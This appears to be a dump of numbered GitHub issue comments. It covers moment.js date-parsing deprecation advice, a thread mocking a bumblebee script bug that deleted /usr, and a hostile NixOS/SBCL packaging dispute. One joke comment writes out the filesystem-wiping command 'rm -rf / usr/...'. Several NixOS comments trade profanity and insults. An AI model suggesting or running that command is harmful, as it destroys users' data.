The grid could be updated for newer browsers, though I doubt things have changed much. The most reliable string format for browsers' native `Date` constructor is of the form ""2014/01/23 23:45:01"", which will only get you local time. Even the ISO 8601 formats aren't well supported in older browsers, according to the page. (See also [issues with `Date.parse`](https://developer.mozilla.org/docs/Web/JavaScript/Reference/Global_Objects/Date/parse#Differences_in_assumed_time-zone).)This is why Moment should and will be parsing pretty much everything on its own. For ""black magic"" stuff and explicit `Date` constructor fallback, I think #1686 is heading in the right direction (for the most part).
"
3918	"Im using Moment to create a local date from an ISO string. The ISO string is part of an URL and is supposed to look like this: ""2014-12-19"". An evil user can try to give a bad string like: ""20XX-13-19""

Im using the following code in Node to fallback to current date if a bad string is given. 

``` javascript
var date = moment(req.params.date).isValid() ? moment(req.params.date).toDate() :  new Date();
// req.params.date is the date part of the url as a string
```

Will this somehow be broken in a near future because of the deprecation?
"
3919	"I consider moment to be what Date should've been, it is that wonderful. As such, any implementation that requires me to use Date, I would consider broken. Thanks to all those that have mentioned the `createFromInputFallback` fallback, I guess can handle Date in one place...
"
3920	"Hi,
I'm using the following technique and still get the warning for deprecation.
`moment( new Date( date ) ).format( 'MMM D, YYYY' );`

Also, when trying:
`moment(new Date(date), 'MMM D, YYYY');`
I'm getting a ""moment object"" instead of the returned date.

Anyone knows why?
"
3921	"So If I use the .format option I get the error message but the value that is returned is the date without the timezone but if I use the following moment(this.organicFieldStatusTo, ""MM-DD-YYYY"", false) 

I don't get the error message but the date that is returned has the time how can I remove the time?   
"
3922	"What about a case where the user pastes a date string into a text field and one would like to check if the string represents a valid date?

Am I mistaken you can't call `isValid()` without constructing a moment object that will raise this deprecation warning?
"
3923	"I browsed the whole thread, but nowhere the most common use case is mentioned: Creating a moment with the current date and time.

Since using new Date() is warned about, what's the supported and recommended way to create a moment with the current datetime?
"
3924	"@kashban `var now = moment();` will give you a moment object representing the current date/time.
"
3925	"I'm clueless about why am i getting this warning now... i had it fixed but now it's back again...

can anyone guess what's the problem? Here's the code, i'm getting the warning at line ""'mild-red-card': (Moment(date... ""

``` javascript
getPicClasses: function () {
        var twoWeeks = Moment().subtract(2, 'weeks').format('MM/DD/YYYY');
        var threeWeeks = Moment().subtract(3, 'weeks').format('MM/DD/YYYY');
        var fourWeeks = Moment().subtract(4, 'weeks').format('MM/DD/YYYY');
        var date = this.props.date;

        return cx({
            'pic': true,
            'mild-red-card': (Moment(date, 'MM/DD/YYYY').isBetween(threeWeeks, twoWeeks)) || Moment(date, 'MM/DD/YYYY').isSame(twoWeeks),
            'red-card': (Moment(date, 'MM/DD/YYYY').isBetween(fourWeeks, threeWeeks)) || Moment(date, 'MM/DD/YYYY').isSame(threeWeeks),
            'red-glowing-card': (Moment(date, 'MM/DD/YYYY').isBefore(fourWeeks) ) || Moment(date, 'MM/DD/YYYY').isSame(fourWeeks)
        });
    },
```

Btw, the date var format is 'MM/DD/YYYY, HH:mm'
"
3926	"Just a thought- what about grabbing a stack trace with `new Error()` and stuffing it in the deprecation warning?  It took me a while to hunt down where this was happening (it was one of our dependencies, https://github.com/urish/angular-moment).  I've just started using the same approach in sails/node-machine and it's been pretty effective so far.  I'll send a PR- feel free to close or accept, no pressure :+1: 
"
3927	"@ichernev @icambron here's a link to that: https://github.com/moment/moment/pull/2175
"
3928	"This is rather confusing. I'm using `var now = new Date();` and then `now.toString()` to put dates into a database, and when I try to read afterwards through `moment(item.value.date).format(""D MMM YY"")` I'm getting the deprecation message. Surely moment works with dates created by javascript?
"
3929	"@simonh1000 I am running into a similar issue, using the original suggested solution of parsing my server created strings through a `new Date()` constructor. I would greatly appreciate @mikermcneil's contribution as it would easily allow me to find where the errors occur.
"
3930	"can you add a stack trace to where the deprecation notice is being called? i can't figure out where it's coming from.

https://github.com/dougwilson/nodejs-depd
"
3931	"Let me hopefully help someone else who is confused (I know it was answered but it wasn't immediately obvious): all you have to do to avoid the deprecation error, having to use new Date & avoiding the unreliability, is to just specify the format of the string that is passed in.

e.g. 

`moment(""2014 04 25"", ""YYYY MM DD""); // string with format`
"
3932	"Yeah, but the ability to make a ""best effort"" guess in date parsing was
actually really useful.

2015-04-01 19:15 GMT+04:00 rey-wright notifications@github.com:

> Let me hopefully help someone else who is confused (I know it was answered
> but it wasn't immediately obvious): all you have to do to avoid the
> deprecation error, having to use new Date & avoiding the unreliability, is
> to just specify the format of the string that is passed in.
> 
> —
> Reply to this email directly or view it on GitHub
> https://github.com/moment/moment/issues/1407#issuecomment-88520183.
"
3933	"you can still do that if you use new Date(). They're deprecating it because it's unreliable.
"
3934	"I had been using moment().subtract(1, ""day"") to get the current date minus one day. Now I am getting the deprecation warning. What is the best way to do this now?

Nevermind...the warning is actually coming from somewhere else. 
"
3935	"Issue when using this fix with MomentJs TimeZones

Converting from UTC to an IANATimeZone
    moment.utc( 'Apr 8, 2015 4:15 PM' ).tz('Australia/Perth')  // Success + Console Error

With Fix
    moment.utc( new Date( 'Apr 8, 2015 4:15 PM' )).tz('Australia/Perth')  // Failure + No Console Error

The result with the fix just stays in UTC time and does not get converted. 
"
3936	"So, just to be clear:
1.   It's not possible to always parse every date like string reliably.
2.   There are dates that work, that sometimes work, and that never work.
3.   Moment doesn't want the blame for dates that sometimes or never work.
4.   Instead of being able to toss warnings on those dates in the future, or to
     explicitly tell moment to do the best it can, e.g., 'moment(something, error:...)' or
     moment(something, guess: true, errror: ...), we tell users to do
     moment(new Date(something)).
5.   This will be much less prone to giving complaints to moment, errors like 
     moment(Date(something)) are clearly the users fault, and new versions of JavaScript
    might someday fix the Date function.

Is this the plan?
"
3937	"This does not make any sense. I use the plugin just to not have to parse date, I want him to do it for me. Now I have to parse to the format that the plugin wants to him parse for the format I want? I better make directly to the format I want.

I'm saying exactly the format that the date is:

`moment('Thu, 30 Apr 2015 3:01 pm', 'ddd, DD MMM YYYY H:mm a')`

Why it can not validate it?
"
3938	"@KaduAmaral You want 'ddd, DD MMM YYYY h:mm a' for your format. Lowercase h, not uppercase H. I assume that's why it's not working for you.
"
3939	"Hi @zackgilbert still not working. 

`moment('Mon, 04 May 2015 8:01 am', 'ddd, DD MMM YYYY h:mm a').isValid()` 

The result is `false`.
"
3940	"Erm, so what about when you are trying to create Moments in UTC using timestamps?  How exactly would you pass a format string for a timestamp?
Never mind, apparently it has to be:

`var myMoment = moment(timestamp, 'x');`

I'm sorry but ugh that kind of defeats the whole purpose of using Moment...
:-1: 
"
3941	"@KaduAmaral 
if you look at the parsing/string-format section of the docs, there isn't even a reference to anything that would give you the day name.  If you take that portion out of your string and try again, it will probably work:

`moment('04 May 2015 8:01 am', 'DD MMM YYYY h:mm a').isvalid()`
"
3942	"I have the same question as @Izhaki and @elliotf. How do you check if something is valid without constructing a moment object which gives the warning?
ie. moment(""filth"").isValid() // gives a warning

I feel like this is a valid use case and don't want to see the warning if there is no problem. Maybe you could argue we should be seeing it since functionality will change at next version, but it will also mask more insidious violations.
"
3943	"This is a confusing error message. I'm sure that the people who put this into my console are very clever and very pleased to demonstrate this to everyone. I'm sorry but I think you've misunderstood why people like me want to use this - I do not want a lecture on software engineering, thanks.

I can see how to hack the stupid warning out of moment well enough - that is likely easier than working out which bit of code here is causing some dumb error which obviously has no effect on users. Thanks for wasting my time.
"
3944	"The following line of code, **really** should not throw this warning...

``` javascript
// This throws the warning
moment( moment().toString() );
```

Why should I have to provide a string to `format()` just to tell moment to return to me a string that it deems acceptable?

This is a simplified test for what I imagine is a common use case of moment:
- get the current time
- save it to a database by invoking toString
- ...later, get the current time and compare it to what was in the database using moment's compare features
- decide what to do depending on how much time has elapsed

Is this deprecation warning being added in order to avoid moment needing to deal with browser inconsistencies? What good is a library if not for abstracting away inconsistencies? Am I missing something here?

**Update:** I discovered that this works if you change the example to:

``` javascript
// This does not throw the warning
moment( moment().format() );
```

This error is really confusing, and it links to this github issue (#1407) which does nothing to clear up what the error is or how to fix it. In addition, the error's stack trace doesn't include references back to the calling code, so it was very difficult to isolate the issue within my codebase. I finally figured it out, but what a total waste of time.
"
3945	"Same here, the stack trace is useless for me.
"
3946	"@lzilioli: Why not use `moment().toISOString()` instead?  This solves the problem and is the same as calling `moment.toJSON()`.  This means if you call `toISOString()` or `toJSON()` then your database version of the date will be the same, unambiguous ISO string as would be sent over the wire in a RESTful service.
"
3947	"``` JavaScript
var isoDateString = ""2015-05-29T12:37:00.000Z"";
var utcDateString = ""Fri, 30 Jul 2010 15:05:00 UTC"";
var test1 = moment(isoDateString, 'MM/DD/yyyy').isValid(); //test1 = false;
var test2 = moment(utcDateString, 'MM/dd/yyyy').isValid();  //test2 = false;
```

So neither the native JS ISO or UTC date formats are valid??  I'm not sure that this approach is the best idea... these are after all widely accepted standard formats to express date/time values in JS.
"
3948	"@wolgamj: It's because you're passing a format string that isn't ISO ('MM/DD/yyyy'), so you're
explicitly telling moment _not_ to parse the input as an ISO string.  If
you stop doing that, moment will parse an ISO string just fine.

```
var isoDateString = ""2015-05-29T12:37:00.000Z"";
var test1 = moment(isoDateString).isValid(); //test1 = true;
```
"
3949	"ok, I have to override a method implemented by moment.js (createFromInputFallback) to disable this warning in my test. when I explicit want to test for `moment(""invalid-date"").isValid()==false`? This does not feel good. A simple config-option would be better.
"
3950	"@defel: you can pass a format string to the moment constructor to avoid the deprecation warning.  Since construction with non-ISO strings is deprecated anyway, this code is essentially equivalent.

```
moment(""invalid-date"", ""ISO"").isValid()==false
```
"
3951	"@cspotcode thanks, that works. I had to do something like this:

``` js
var startDate = is.date(request.payload.startDate) ? 
    moment(request.payload.startDate) : 
    moment(request.payload.startDate, ""ISO"");
```
"
3952	"@cspotcode thanks, you've answered my question as well as those by @Izhaki and @elliotf.
"
3953	"Yes, this is an annoying warning and it is hard to debug. Whether or not if it is worthwhile, I have no idea. But I just wanted to provide some additional info. Since moment is used in some plugins, code like

``` javascript
    $('.datePicker').datetimepicker({
        defaultDate: ""11/1/2013"",
        format: 'MM/DD/YYYY'
    });
```

Can cause the warning. To solve it, fix defaultDate to be an ISO string or whatever or just take it out.
"
3954	"Docs should be updated: http://momentjs.com/docs/#/parsing/date/
"
3955	"I saw in the next major version the warning message will be removed when you use isValid after the constructor:

```
moment('some invalid string').isValid(); //throws warning.
```

This is still happening in version 2.10.6
"
3956	"@alexserver in case you missed it, @cspotcode's answer above provides a nifty work-around for using isValid() :)
"
3957	"I opened a ticket for RFC2822 dates: #2530
"
3958	"Hi guys,

I got this message as well. I found my code which was causing it which was

timeinbound = moment.tz('RcvTimestampUtc', 'Australia/Melbourne').format('DD MMMM YYYY hh:mm:ss A');

I then changed it to include the format of the 'RcvTimestampUtc' string so moment didn't complain about the issue.

timeinbound = moment.tz('RcvTimestampUtc', 'YYYY-MM-DD hh:mm:ssZ', 'Australia/Melbourne').format('DD MMMM YYYY hh:mm:ss A');

Hope this helps someone else.
"
3959	"Issue - using javascript Date() constructor dosent work with moment.utc() constructor and moment timezones

``` javascript
var datetime = 'Aug 7, 2015 9:00 AM';
moment.utc ( datetime ).tz( timezone )         // Works perfectly (except for the warning)
moment.utc ( new Date( datetime ) ).tz( timezone )     // Fails to convert to timezone
```
"
3960	"Is there a way to silence this warning? It's driving me insane.
"
3961	"@Radagaisus What about this?

![screen shot 2015-09-08 at 15 40 58](https://cloud.githubusercontent.com/assets/827445/9744070/2161e916-5640-11e5-93ec-7533c3f47c1e.png)
"
3962	"@brunocoelho Thanks! Do you know of a way to silence it in Node.js? Our tests output are spammed with these warnings.
"
3963	"Fork the library, search the text. Disable the output. Then use your fork.
Is what I recommend.

On Tue, Sep 8, 2015 at 1:23 PM, Almog Melamed notifications@github.com
wrote:

> @brunocoelho https://github.com/brunocoelho Thanks! Do you know of a
> way to silence it in Node.js? Our tests output are spammed with these
> warnings.
> 
> —
> Reply to this email directly or view it on GitHub
> https://github.com/moment/moment/issues/1407#issuecomment-138675609.
"
3964	"@Radagaisus I'm afraid not, I don't use Node.js that much.

@jsilverMDX And remembering to merge with the original one every time a new version is released? I don't think it's a good idea.
"
3965	"For what its worth, I was getting the same warning and was initially confused at why I was getting it. After reading through several of the comments here and some trial and error, this seems to work for me, and I no longer get the error.  So moving forward, is this the way moment intends for us to pass in dates?  It seemed more useful to have it handling that for users:

`return (moment(new Date(data)).isValid() ? moment(new Date(data)).format('MM/DD/YYYY h:mm A') : ' -- ');`

In the example above if I have a valid date, I format that, otherwise I return 2 dashes as a placeholder.  So ""September, 22 2015 17:17:33 -0400""  gets converted to ""09/22/2015 5:17 PM""
"
3966	"@pmolaro: Moment can do that, too.  You just need to [give it a format string](http://momentjs.com/docs/#/parsing/string-format/).  For example:

```
var d = moment(data, 'MMMM Do YYYY, h:mm:ss a'); // don't forget your format string
return (d.isValid() ? d.format('MM/DD/YYYY h:mm A') : ' -- ');
```

You can specify an array of formats, and moment will try them all.
"
3967	"For everyone following @cspotcode's workaround, note that the second argument should actually be `moment.ISO_8601`, ie

```
moment(""invalid-date"", moment.ISO_8601).isValid()==false
```

relating to #2036 
"
3968	"What if my date is in this format: ""2015-10-06 00:00:00.0"" and in my function I am doing this:

moment(""2015-10-06 00:00:00.0"").format(""D MMM YYYY"");

Is this fine or will it stop working?
"
3969	"@ichernev Could you please add the final conclusion, As comments in this issue is too long. 
"
3970	"I'm sorry guys I'm having a hard time understanding. How can I modify this code so that I am compliant?

``` javascript
var Benchmark = require('benchmark'),
    moment = require(""./../moment.js""),
    base = moment('2013-05-25');

module.exports = {
  name: 'clone',
  onComplete: function(){console.log('done');},
  fn: function(){base.clone();},
  async: true
};
```
"
3971	"By using the default JavaScript Date constructor to construct your date object before sending it in to moment. So moment doesn't have to be responsible for parsing your Date string.

```
moment(new Date('2013-05-25'));
```
"
3972	"I get the same error as @imsobear. I am trying to convert from ""9:00 AM"" format to ""00:00:00"" format so I can store it as a TIME type in MySQL database. But how to do so?

moment(""9:00 AM"").format(""HH:mm:ss"");

<blockquote>
Deprecation warning: moment construction falls back to js Date. This is discouraged and will be removed in upcoming major release. Please refer to https://github.com/moment/moment/issues/1407 for more info.
Error
    at Function.createFromInputFallback (http://localhost:3000/javascripts/vendor/moment.js:746:36)
    at configFromString (http://localhost:3000/javascripts/vendor/moment.js:826:32)
    at configFromInput (http://localhost:3000/javascripts/vendor/moment.js:1353:13)
    at prepareConfig (http://localhost:3000/javascripts/vendor/moment.js:1340:13)
    at createFromConfig (http://localhost:3000/javascripts/vendor/moment.js:1307:44)
    at createLocalOrUTC (http://localhost:3000/javascripts/vendor/moment.js:1385:16)
    at local__createLocal (http://localhost:3000/javascripts/vendor/moment.js:1389:16)
    at utils_hooks__hooks (http://localhost:3000/javascripts/vendor/moment.js:16:29)
    at Object.$.validate.submitHandler (http://localhost:3000/javascripts/addstudentform.js:620:35)
    at d (http://localhost:3000/javascripts/vendor/jquery.validate.min.js:4:885)
addstudentform.js:621 Invalid date
</blockquote>
"
3973	"I started getting deprecation warning, but cannot see how I can use both locale and strictness without using this going-to-be-deprecated feature:

``` js
moment('23 December 2015', 'DD MMMM YYYY', 'en', true).isValid();
```

@ichernev  what is the migration path for this feature?
"
3974	"I seem to be getting this warning after a moment object is coerced into a string. The resulting string becomes `%222015-11-11T10:59:59.999Z%22`, which corresponds to `""2015-11-11T10:59:59.999Z""`. Isn't a moment supposed to convert itself to a string into a format which would be validated by the moment constructor itself?

Is moment adding those quotes or is that coming out of the toString() method like that?
"
3975	"@adambuczynski looks like url encoding.  Moment won't do that, must be coming from elsewhere.
"
3976	"@iamstarkov - That code is fine and does not produce the deprecation error, nor will it be removed.
"
3977	"@ipsita93 

``` javascript
moment(""9:00 AM"",""h:mm a"").format(""HH:mm:ss"");
```
"
3978	"@mj1856 actually, its [producing error](https://travis-ci.org/iamstarkov/jsunderhood/builds/90392917#L973-L985), while im [using momentjs in `get-md-date`](https://github.com/iamstarkov/get-md-date/blob/master/index.js#L6) in exactly that way
"
3979	"@warrendodsworth  - yuck - no, please avoid that.  The `Date` constructor will parse differently depending on implementation.  In most current browsers, `moment(new Date('2013-05-25'))` would produce the local equivalent of the UTC midnight of that date, similar to if you used `moment.utc('2013-05-25').local()`.

Just do `moment('2013-05-25')`, which is not deprecated.  Or, to be absolutely certain, use `moment('2013-05-25','YYYY-MM-DD')`, which will do the same thing.
"
3980	"@adrianaguirre - Your code is already compliant, at least the code you showed here. `2013-05-25` is one of the recognized ISO 8601 formats.
"
3981	"@auluckh23  - Yes, that is fine.  Fractional seconds are valid by ISO8601.
"
3982	"@pmolaro, and all others trying to just remove the deprecation warning.  Yes, `moment(new Date(string))` will stop the deprecation warning, but then you are entirely missing the point.

The point is, parsing dates via the `Date` object is unreliable and inconsistent across platforms.  There are different implementations and different behaviors.  Sometimes you may get local time. Sometimes you may get UTC.  Sometimes you may get `Invalid Date`.  Sometimes you will get different results near DST transitions.

Don't try to defeat the error.  Instead, follow our guidelines.  Either use a known format or supply a format string.

The known formats are [the ISO8601 forms listed here](http://momentjs.com/docs/#/parsing/string/), and [the older ASP.NET JSON Date form shown here](http://momentjs.com/docs/#/parsing/asp-net-json-date/).  **Anything else needs a format string.**
"
3983	"I've locked this thread.  If after reading this thread and looking at your code carefully you still don't understand, then [chat with me on Gitter](https://gitter.im/moment/moment).   There's nothing more to talk about here. Thanks.
"
3984	"Ya this happened to me.  I wasn't sure what went wrong, but chaos ensued shortly after I ran the install script.  I have to work tommorow, and require my computer, so this could be a late night reinstalling/recovering my personal files.  Oh well, I guess that is what I get for alpha testing ;D
"
3985	"GIANT BUG... causing /usr to be deleted... so sorry....
"
3986	"This made me laugh :)
"
3987	"Yeah... I was very tired that night...
"
3988	"Guess it's ok to laugh about it now :-)
Btw props to MrMEEE - this driver has totally saved me from having to do cad
in windows. Legendary piece of work! I don't even mind that it wiped my
machine the first time I tried it :-)
On Jun 16, 2011 10:01 PM, ""MrMEEE"" <
reply@reply.github.com>
wrote:

> Yeah... I was very tired that night...
> 
> ## 
> 
> Reply to this email directly or view it on GitHub:
> https://github.com/MrMEEE/bumblebee/issues/123#issuecomment-1381166
"
3989	"poor guy..
"
3990	"nice...
"
3991	"dude. you are famous now
"
3992	"Wow - just read the commit thread on github. Took me longer than it did
to reinstall my machine.
Epic. Had no idea that was going on.
"
3993	"It took me longer to load the pictures in that commit than to reinstall my machine.
"
3994	"DMA-BUF is the real solution to this problem.
"
3995	"epic xd
"
3996	"。。。。。。。。。。。。。。。
"
3997	"Haha people even reference to this issue lolol

Long it will be remembered
"
3998	"Link to a commit for future reference, awesomeness and epic comments since this issue comes up in Google instead:

https://github.com/MrMEEE/bumblebee-Old-and-abbandoned/commit/a047be85247755cdbe0acce6#diff-1
"
3999	"![](http://www.planetcalypsoforum.com/gallery/files/4/5/5/0/8/mother-god-meme.jpg)
"
4000	"LOL, i am on the process of [recovering](http://www.iphonetransferrecovery.com/tutorials/recover-iphone-contacts-mac.html) my own files.  Fortunately, it's just a test machine. I'd love to see if some one deployed the script on an working server
"
4001	"mom i have been here
"
4002	"So interesting a bug 
"
4003	"Just place the space before <code>usr</code>.<br>
Example:<code># rm -rf / usr/...</code><br>
It anyway doesn't come with any warranty so..
"
4004	Oh boy. This really exists. Thought it was only urban legend...
4005	I just heard about this and come around to see what happened, and…hahaha…
4006	We still remember!
4007	nice~
4008	wow, remarkable bug
4009	WAHAHAHAHAHAHA
4010	Leave my name here so that subsequent viewers will see my name :joy: 
4011	@ice1000 same here haha
4012	Same for me x) My IT teacher showed me this one 
4013	Tourists from [Zhihu.com](https://www.zhihu.com/question/62248491/answer/196307179)
4014	"Tourists from Zhihu.com + 1
23333333333333333333333333333"
4015	“This is a visitor from ![Zhihu](www.zhihu.com).”
4016	like this if ur reading in 2007
4017	how could this happen...
4018	I'm writing in the epic thread.
4019	Hi from May, 2018
4020	Hi from June, 2018. We are in the history of github forever
4021	🤪
4022	"Like exploring abandoned subway tunnels. *distant echoes*

*scrabbling rats*"
4023	I wish one can just, reverse the acquisition from Microsoft
4024	@Serkan-devel will you fund github's dying business model then? 
4025	What a nice place for meditation.
4026	It happened in the first year of my career as a programmer, still remember it!
4027	Hello from Aug, 2018!
4028	It's really famous. :)
4029	"https://www.theregister.co.uk/2018/10/05/windows_10_wipes_files/

Microsoft you may want to check for extra spaces..."
4030	Hello from October, 2018
4031	"Stop this ""hello from [date]"" stupid bullshit, please. It's October, 2018 already, and you still can't understand what happens to a joke spoken twice."
4032	@Yodzorah It's not a joke. It's a greeting. Learn the difference. Hello from October 2018! 🤣 ☮️ 
4033	Microsoft just has done something like this with Oct 2018 update...
4034	At least we know where MrMEEE now works
4035	@jofftiquez Hello from November, 2018 🤣
4036	@HPaulowicz hey mate! Hello from November, 2018! 🤣 
4037	"I tried building SBCL-1.2.5, cutting out the SB-POSIX tests until I can figure out something better.

```
This is SBCL 1.2.5.53-c787e53-dirty, an implementation of ANSI Common Lisp.
More information about SBCL is available at <http://www.sbcl.org/>.

SBCL is free software, provided as is, with absolutely no warranty.
It is mostly in the public domain; some portions are provided under
BSD-style licenses.  See the CREDITS and COPYING files in the
distribution for more information.
fatal error encountered in SBCL pid 30324(tid 140737354086144):
can't load .core for different runtime, sorry


Welcome to LDB, a low-level debugger for the Lisp runtime environment.
ldb>
```

I'm betting that this is NixOS related. there were issues trying to run an XULrunner binary too for whatever it's worth.
"
4038	"Some notes:

 1) For the overall design of the language and concepts, Eelco's papers are (for better or worse) the best place to look, I think. They describe the language, its motivations, and NixOS rather thoroughly. Some good starting points are [Nix: A Safe and Policy Free System for Software Development](http://nixos.org/~eelco/pubs/nspfssd-lisa2004-final.pdf), and [NixOS: A Purely functional Linux distribution](http://nixos.org/~eelco/pubs/nixos-icfp2008-final.pdf).

  It's been known for a while that unfortunately documentation is lacking on a few of these fronts. It's absolutely something we need to fix (I too think the NixOS on-boarding and beginner material is fairly sub-par).

 2) Related to the above, there is no true BNF describing the Nix parser, unfortunately. This was a question raised recently in an attempt to write another Nix implementation in Haskell. A proper BNF is something that should be easy to add to the documentation somewhere.

 3) I am confused by your inquiry about libraries being available. `libx11`, `libxau`, etc are all readily available in Nixpkgs (if they weren't, many other things would not be either). Your query of `ls /nix/store` does not tell you anything useful or meaningful. You must query the actual repository, which is described using Nix. For example:

```
$ nix-env -qa | egrep -i '(libx11|libxau)'
libX11-1.6.2
libXau-1.0.8
```

 In your paste of the Emacs `default.nix` file, one dependency is specified as `x11`. This is not the same as `libX11` - indeed, `x11` is actually a meta-package which encompasses the modular Xorg framework and many libraries, including `libXext`, `libXft`, `libX11`, etc etc. You may determine this by looking at what the name `x11` is bound to in `pkgs/top-level/all-packages.nix` and seeing what other packages it incorporates.

That said, I'm afraid I cannot help you with SBCL or StumpWM. I use neither. As it stands today, the NixOS community is structured such that all Nix users are, in essence, de-facto Nix developers. This community is still so small it is almost a requirement for you to use it regularly. In return, most of us believe the benefits are massive enough to deal with that. But it is not true of everyone. That is an understandably painful reality, but it's a reality we cannot yet change. Hopefully in the future we can have enough users and dedicated maintainers to alleviate this burden from the userbase, and StumpWM and SBCL and X number of other things will just work for anyone who wants them, with no effort.

If a package is broken or outdated or unmaintained (which happens with any distro), it almost always falls to a user who wishes to use that software to maintain it, I'm afraid. Have you tried asking on the `#nixos` channel on freenode? I've found many helpful people there in my time who may be willing to assist you in getting a more recent SBCL and StumpWM working.

---

Oh, and one final thing about your 'editors note' (which I'll quote to ensure everyone can read it for the future):

```
# Fix the tests [editor's note: 'fix' the tests by removing them? fuck you.]
```

If you wish to behave this way, I'm afraid my impression is that your mind about how to conduct yourself in public spaces is fairly made up - and no amount of honest actors will change that behavior or attitude.

I can understand frustration at using new software and being perplexed by it. But your tone in here is pretty clear. And I imagine those aren't attitudes or tone we want anyway - besides, nothing brought you here beyond your own desires.

So, if that is the case, maybe it would be best for you to find a community that does appreciate that sort of attitude - perhaps the Common Lisp community does. Or the Xbox Live community, perhaps.
"
4039	"```
1) For the overall design of the language and concepts, Eelco's papers are (for
better or worse) the best place to look, I think. They describe the language,
its motivations, and NixOS rather thoroughly. Some good starting points are Nix:
A Safe and Policy Free System for Software Development, and NixOS: A Purely
functional Linux distribution.
```

For worse.

```
A proper BNF is something that should be /easy/ to add to the documentation somewhere.
```

I would use the term ""tedious bullshit"" to describe this task, but whatever, moving on.

```
3) I am confused by your inquiry about libraries being available. libx11,
libxau, etc are all readily available in Nixpkgs (if they weren't, many other
things would not be either). Your query of ls /nix/store does not tell you
anything useful or meaningful. You must query the actual repository, which is
described using Nix. For example:

$ nix-env -qa | egrep -i '(libx11|libxau)'
libX11-1.6.2
libXau-1.0.8
```

I'm an idiot, thank you.

```
In your paste of the Emacs default.nix file, one dependency is specified as
x11. This is not the same as libX11 - indeed, x11 is actually a meta-package
which encompasses the modular Xorg framework and many libraries, including
libXext, libXft, libX11, etc etc. You may determine this by looking at what the
name x11 is bound to in pkgs/top-level/all-packages.nix and seeing what other
packages it incorporates.
```

I'll look into this now.

```
That said, I'm afraid I cannot help you with SBCL or StumpWM. I use neither. As
it stands today, the NixOS community is structured such that all Nix users are,
in essence, de-facto Nix developers. This community is still so small it is
almost a requirement for you to use it regularly. In return, most of us believe
the benefits are massive enough to deal with that. But it is not true of
everyone. That is an understandably painful reality, but it's a reality we
cannot yet change. Hopefully in the future we can have enough users and
dedicated maintainers to alleviate this burden from the userbase, and StumpWM
and SBCL and X number of other things will just work for anyone who wants them,
with no effort. If a package is broken or outdated or unmaintained (which
happens with any distro), it almost always falls to a user who wishes to use
that software to maintain it, I'm afraid.
```

WIP, K.

```
Have you tried asking on the #nixos channel on freenode? I've found many helpful
people there in my time who may be willing to assist you in getting a more
recent SBCL and StumpWM working.
```

curl http://nixos.org/irc/logs/log.20141112 | grep gabriel_laddel

```
Oh, and one final thing about your 'editors note' (which I'll quote to ensure
everyone can read it for the future):

# Fix the tests [editor's note: 'fix' the tests by removing them? fuck you.]

If you wish to behave this way, I'm afraid my impression is that your mind about
how to conduct yourself in public spaces is fairly made up - and no amount of
honest actors will change that behavior or attitude.
```

(dolist (k '(""define remove"" ""define fix"" ""define test"") (google k)))

```
I can understand frustration at using new software and being perplexed by it.
```

```
(google ""define perplexed"") ;=> 

per·plexed/pərˈplekst/
adjective

    completely baffled; very puzzled.

per·plex/pərˈpleks/
verb

    (of something complicated or unaccountable) cause (someone) to feel
    completely baffled.

```

There is nothing perplexing about Nix.

```
But your tone in here is pretty clear. And I imagine those aren't attitudes we
want anyway
```

A person with the handle thoughtpolice doesn't want anyone to use mean words or to be critical of a project he is involved with? Color me shocked.

```
besides, nothing brought you here beyond your own desires.
```

...

```
So, if that is the case, you should find a community that does appreciate that
sort of attitude - perhaps the Common Lisp community does. Or the Xbox Live
community, perhaps.
```

_sizzle_

Thanks for the help.
"
4040	"> A person with the handle thoughtpolice doesn't want anyone to use mean words or to be critical of a project he is involved with?

No, actually. It's because I'm a developer who works on other open source projects (several for my job), and realistically I have better things to do than deal with annoying people telling me and other people in the projects I work on to go fuck themselves - which substantially decreases my motivation to deal with said project in the first place. Indeed, my respect lies with the NixOS developers, and not you. So you'll have to forgive me if I find you annoying, but that's life sometimes.

This should be pretty plainly obvious (as opposed to your quite rude assumption of my motivations and presumably willful misinterpretation of it, as if it would help your position). But apparently it needs to be spelled out to some people who are seemingly incapable of understanding these aspects of social interaction and why their behaviors might be considered harmful. Which I believe are pretty clearly alluded to in my original posting.

Of course, I'm not about to succumb to such belittling tactics by people like you - that would only prove such tactics work to drive people away, ultimately harming everyone. So I'm afraid the feared Orwellian Thought Police of NixOS™ is here to stay -- much to your great despair, I imagine. Be afraid - be very afraid!

---

That said, this bug is a bit convoluted. Really there are several things going on here, based on your original description:

  1) The emacs package is missing several things, including:
    - Infopages are not built by default.
    - PDF/postscript viewing doesn't work.

  2) Dependencies for Emacs are unclear, although as I explained before, we should have all of these readily available. They merely follow different conventions for naming/meta-packaging. If something is missing, it can certainly be upstreamed.

  3) SBCL tests should not be nerfed; furthermore they should likely be integrated into the build process on Hydra, so ever. How/if this can be fixed depends on the upstream project and the tests in question; while many projects do enable tests (by specifying `doCheck = true;` in their `default.nix`), this isn't always easily doable in some cases. I'm afraid I don't know much about the specific tests in question here to comment.

 4) SBCL dynamic dependencies/cffi libraries need to be properly managed in some way. There are a slew of other packages that manage their _own_ subpackages in a similar way; Emacs is one of them, in fact. Another is OCaml or the Haskell package set. In short, we tend to write environment wrappers which properly 'set up' the environment for a specific package.

  For example, when we use GCC and specify a library like `libxml2` in the `buildInputs` of an executable, this actually is translated into a set of paths in which GCC will look for libraries - this way, `#include` directives properly work, as well as flags like `-lxml2`. These paths are actually provided via environment variables - and GCC is actually a shell script that wraps the _real_ GCC in with the proper flags.

  This explains why we have packages like `clang-wrapper` or whatnot. We would probably equally need something like an `sbcl-wrapper` tool, that when invoked will properly set up an environment in which the real SBCL executable will be able to `dlopen()` the right libraries (assuming of course there's some flag/option to control the base directory of where the `dlopen` occurs and where SBCL searches for shared objects in the first place).

  Then, individual SBCL packages would go into their own namespace, such as `nixpkgs.sbclPackages`, where people could select the sub libraries they want. We have quite a few toolchains that follow this exact scenario.

 5) StumpWM and SBCL are outdated it seems, and could do with a working update.

Really though, these are all separate issues in a way, so I would suggest you file them each in a ticket so they can be triaged and more easily tracked by developers.

Having a meta-ticket is fine in general AFAIK (maybe 'overhaul SBCL support' which most of the issues would fall under), although keeping separate issues for the separate subtasks makes it easier to manage them and address individual concerns.

Of course, I'm not going to do this for you, but I'd suggest that it's probably the easiest way to at least have your complaints looked at (as opposed to posting a very long Emacs buffer - the syntax highlighting actually makes it rather painful to read).

> Thanks for the help.

Don't worry about it - although you won't be getting any from me in the future. Although I will certainly return and be sure to call you out on shitty behavior should I see it. After all, what kind of Thought Police™ would I be if I didn't? I'd be letting you down, what with the expectations you set for me!
"
